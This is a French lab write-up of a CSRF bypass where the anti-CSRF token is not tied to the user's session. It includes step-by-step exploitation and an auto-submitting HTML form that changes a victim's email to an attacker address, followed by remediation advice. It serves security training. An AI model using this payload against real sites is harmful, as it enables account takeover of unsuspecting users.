Rapport Méthodologique : Contournement de CSRF via un Jeton Non Lié à la Session
1. Informations Générales
Nom de la vulnérabilité : CSRF (Cross-Site Request Forgery)

Gravité : Élevée (Permet une prise de contrôle partielle de compte via changement d'email)

Statut du Lab : Résolu (Niveau : Practitioner)

2. Analyse de la Vulnérabilité
Le mécanisme de défense mis en place par l'application repose sur un jeton anti-CSRF nommé csrf. Cependant, l'implémentation souffre d'un défaut de conception majeur : le serveur vérifie uniquement si le jeton soumis existe et est valide globalement, mais il ne valide pas si ce jeton appartient à l'utilisateur qui effectue la requête.

Conséquence :
Un attaquant peut utiliser son propre compte pour générer un jeton CSRF valide, puis l'injecter dans un formulaire malveillant. Lorsque la victime soumet ce formulaire, l'application valide la transaction car le jeton est correct, bien qu'il appartienne à l'attaquant.

3. Méthodologie d'Exploitation (Pas à Pas)
Étape 1 : Phase de Reconnaissance
Connexion au compte attaquant (carlos:montoya).

Navigation vers la fonctionnalité cible (changement d'email).

Inspection du code source HTML pour localiser le paramètre de sécurité :

HTML
<input required type="hidden" name="csrf" value="[JETON_CSRF_ATTAQUANT]">
Étape 2 : Préparation de l'Exploit
Nous construisons un exploit HTML minimaliste conçu pour s'exécuter automatiquement à l'insu de la victime.

Note technique : Le jeton étant à usage unique (one-time token), l'attaquant doit en générer un frais en rafraîchissant sa page, sans l'utiliser lui-même.

HTML
<form action="https://[ID-CIBLE].web-security-academy.net/my-account/change-email" method="POST" id="csrf-poc">
    <input name="email" value="pwn@evil.com">
    <input name="csrf" value="D8AGHB0f09EIn8J9ymVEZHnGIKQCV8N7">
</form>

<script>
    // Soumission automatique immédiate
    document.getElementById('csrf-poc').submit();
</script>
Étape 3 : Livraison (Delivery)
Le script HTML est hébergé sur le serveur d'exploit. Dès que la victime (connectée à sa propre session) consulte cette page, son navigateur transmet automatiquement :

Ses propres cookies de session (qui l'identifient auprès du serveur).

Le formulaire contenant le jeton CSRF valide de l'attaquant.

L'application associe la session de la victime au jeton valide et applique le changement d'email.

4. Recommandations de Remédiation (Mitigation)
Pour corriger efficacement cette vulnérabilité, l'équipe de développement doit :

Lier le Jeton à la Session (Cryptographic Binding) : Associer de manière stricte chaque jeton CSRF généré à l'identifiant de session (Session ID) de l'utilisateur concerné. Le serveur doit rejeter la requête si le jeton fourni ne correspond pas à la session active.

Utiliser des mécanismes de défense intégrés : Privilégier l'utilisation de frameworks web modernes qui gèrent nativement et de manière sécurisée la génération et la validation des jetons CSRF.

Configurer l'attribut SameSite : Restreindre l'envoi des cookies de session lors de requêtes cross-sites en configurant l'attribut des cookies sur SameSite=Lax ou SameSite=Strict.